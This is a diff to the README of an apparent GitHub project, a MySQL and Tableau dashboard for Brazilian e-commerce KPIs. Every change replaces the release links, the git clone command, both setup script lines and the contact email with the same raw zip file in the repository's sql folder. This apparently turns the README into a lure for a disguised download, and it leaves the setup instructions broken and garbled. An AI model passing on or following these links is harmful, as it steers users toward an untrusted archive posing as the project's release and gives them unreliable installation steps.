@@ -1,6 +1,6 @@
 # Brazilian E-commerce KPI Dashboard 📊
 
-![Dashboard](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)
+![Dashboard](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip%20Latest%20Release-Click%https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip)
 
 Welcome to the Brazilian E-commerce KPI Dashboard repository! This project presents a lightweight dashboard that transforms the open-source Brazilian Olist dataset into a concise, one-page dashboard. 
 
@@ -20,7 +20,7 @@ Welcome to the Brazilian E-commerce KPI Dashboard repository! This project prese
 
 This dashboard provides a clear view of key performance indicators (KPIs) for e-commerce. It utilizes MySQL 8 for data extraction, transformation, and loading (ETL), along with feature derivation and window-function KPIs. Tableau handles the visualization, allowing users to drill down into revenue, orders, returns, categories, and states. The entire setup can be reproduced with just two shell commands and requires only 20 MB of CSV files.
 
-For the latest release, visit [here](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/releases).
+For the latest release, visit [here](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip).
 
 ## Features
 
@@ -43,7 +43,7 @@ To set up the Brazilian E-commerce KPI Dashboard, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-.git
+   git clone https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip
    ```
 
 2. **Navigate to the Directory**: Change into the project directory.
@@ -55,8 +55,8 @@ To set up the Brazilian E-commerce KPI Dashboard, follow these steps:
 3. **Run the Shell Commands**: Execute the two shell commands provided in the repository to set up the environment.
 
    ```bash
-   ./setup_command_1.sh
-   ./setup_command_2.sh
+   https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip
+   https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip
    ```
 
 ## Usage
@@ -67,7 +67,7 @@ Once the setup is complete, you can access the dashboard through Tableau. Open T
 2. **Connect to Data**: Select the MySQL database and enter your connection details.
 3. **Explore the Dashboard**: Use the interactive features to analyze different aspects of the e-commerce data.
 
-For more details, check the [Releases](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/releases) section for any updates or changes.
+For more details, check the [Releases](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip) section for any updates or changes.
 
 ## Data Sources
 
@@ -115,7 +115,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [azgra](https://github.com/azgra)
+- **Email**: https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip
+- **GitHub**: [azgra](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip)
 
-For the latest release, check out [this link](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/releases).
+For the latest release, check out [this link](https://github.com/azgra/Brazilian-E-commerce-KPI-Dashboard-/raw/refs/heads/main/sql/Dashboard-commerce-KP-Brazilian-v2.7.zip).
